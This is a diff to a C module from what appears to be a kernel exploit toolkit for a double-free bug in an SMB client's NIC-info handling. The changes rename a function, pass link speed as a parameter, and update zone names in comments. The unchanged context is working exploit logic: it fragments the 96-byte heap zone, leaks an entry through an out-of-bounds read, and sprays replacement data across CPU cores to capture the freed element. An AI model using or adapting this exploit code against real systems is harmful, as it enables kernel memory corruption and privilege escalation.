@@ -32,7 +32,7 @@
 
 ///
 /// This module provide a framework for exploiting the double free vulnerability discussed in
-/// "POCs/poc_double_free". See "../smb_dev_rw.c" for an example use of this module
+/// "poc/poc_double_free". See "../smb_dev_rw.c" for an example use of this module
 ///
 
 
@@ -61,9 +61,9 @@ int xpl_kheap_free_leak_nic(smb_nic_allocator allocator, const struct sockaddr_i
     
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
     
-    int num_gaps = xpl_PAGE_SIZE / 96 * 4;
+    int num_gaps = XPL_PAGE_SIZE / 96 * 4;
     
-    /// Fragment kext.96 zone
+    /// Fragment default.96 zone
     for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
         struct network_nic_info element;
         bzero(&element, sizeof(element));
@@ -88,7 +88,7 @@ int xpl_kheap_free_leak_nic(smb_nic_allocator allocator, const struct sockaddr_i
     xpl_assert_err(error);
     
     struct complete_nic_info_entry* entry = alloca(96);
-    /// Read the `struct complete_nic_info_entry` from the fragment kext.96 zone
+    /// Read the `struct complete_nic_info_entry` from the fragmented default.96 zone
     error = xpl_oob_reader_ovf_read(addr, 96, (char*)entry, 96);
     if (error) {
         return error;
@@ -113,7 +113,7 @@ int xpl_kheap_free_leak_nic(smb_nic_allocator allocator, const struct sockaddr_i
 }
 
 
-void xpl_kheap_free_alloc_slowdown_nic(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
+void xpl_kheap_free_associated_ip_addrs(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len, uint32_t link_speed) {
     size_t done = 0;
     size_t max_batch_size = 1024;
     while (done < count) {
@@ -128,10 +128,7 @@ void xpl_kheap_free_alloc_slowdown_nic(smb_nic_allocator allocator, int nic_inde
             /// We have to provide unique `sin_addr` for each socket address in the NIC
             info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
             info->next_offset = sizeof(*info);
-            /// The tailq entries in `client_nic_info_list` are sorted by their `nic_link_speed`
-            /// at the time of insertion. Providing a large value makes sure these slow down
-            /// NICs end up in the head of `client_nic_info_list` tailq
-            info->nic_link_speed = UINT32_MAX;
+            info->nic_link_speed = link_speed;
         }
         int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
         xpl_assert_err(error);
@@ -153,7 +150,7 @@ xpl_kheap_free_session_t xpl_kheap_free_session_create(const struct sockaddr_in*
 
 struct complete_nic_info_entry xpl_kheap_free_session_prepare(xpl_kheap_free_session_t session) {
     xpl_assert(session->state == STATE_CREATED);
-    /// kext.64 zone allocator
+    /// default.64 zone allocator
     xpl_allocator_nrnw_t nrnw_allocator = xpl_allocator_nrnw_create(&session->smb_addr);
     /// Leak a `struct complete_nic_info_entry`
     smb_nic_allocator nic_allocator;
@@ -163,7 +160,7 @@ struct complete_nic_info_entry xpl_kheap_free_session_prepare(xpl_kheap_free_ses
         nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
         int error = xpl_kheap_free_leak_nic(nic_allocator, &session->smb_addr, &entry);
         if (error) {
-            xpl_allocator_nrnw_allocate(nrnw_allocator, 64, xpl_PAGE_SIZE / 64 * 32);
+            xpl_allocator_nrnw_allocate(nrnw_allocator, 64, XPL_PAGE_SIZE / 64 * 32);
             smb_nic_allocator_destroy(&nic_allocator);
         } else {
             break;
@@ -193,7 +190,12 @@ void xpl_kheap_free_session_execute(xpl_kheap_free_session_t session, const stru
         if ((i % ((NUM_SLOW_DOWN_NICS + 9) / 10)) == 0) {
             xpl_log_info("progress: %.2f%%", ((float)i / NUM_SLOW_DOWN_NICS) * 100.0);
         }
-        xpl_kheap_free_alloc_slowdown_nic(session->nic_allocator, INT32_MAX - i, NUM_SOCKETS_PER_SLOW_DOWN_NIC, sizeof(struct sockaddr_in));
+        
+        /// The tailq entries in `client_nic_info_list` are sorted by their `nic_link_speed`
+        /// at the time of insertion. Providing a large value makes sure these slow down
+        /// NICs end up in the head of `client_nic_info_list` tailq
+        uint32_t link_speed = UINT32_MAX;
+        xpl_kheap_free_associated_ip_addrs(session->nic_allocator, INT32_MAX - i, NUM_SOCKETS_PER_SLOW_DOWN_NIC, sizeof(struct sockaddr_in), link_speed);
     }
     xpl_log_info("done perparing for free");
 
@@ -202,10 +204,10 @@ void xpl_kheap_free_session_execute(xpl_kheap_free_session_t session, const stru
     /// 96 to the double free NIC. Since these socket addresses are released before the release
     /// of `struct complete_nic_info_entry`, they will fill the per CPU cache of the CPU handling
     /// this job
-    xpl_kheap_free_alloc_slowdown_nic(session->nic_allocator, (uint32_t)replacement_entry->nic_index, 512, 96);
+    xpl_kheap_free_associated_ip_addrs(session->nic_allocator, (uint32_t)replacement_entry->nic_index, 512, 96, 0);
     
     /// We will be using one CPU core for triggering the double free and others for spraying
-    /// the kext.96 zone with replacement data
+    /// the default.96 zone with replacement data
     int num_capture_allocators = xpl_cpu_count() - 1;
     smb_nic_allocator* capture_allocators = malloc(sizeof(smb_nic_allocator) * num_capture_allocators);
     dispatch_apply(num_capture_allocators, DISPATCH_APPLY_AUTO, ^(size_t index) {
@@ -228,7 +230,7 @@ void xpl_kheap_free_session_execute(xpl_kheap_free_session_t session, const stru
             xpl_assert(error == ENOMEM);
             *capture_done = TRUE;
         } else {
-            /// Spray kext.96 zone with replacement data
+            /// Spray default.96 zone with replacement data
             smb_nic_allocator allocator = capture_allocators[index];
             
             struct network_nic_info* infos = malloc(sizeof(struct network_nic_info) * NUM_SOCKADDR_ALLOCS_PER_NIC);
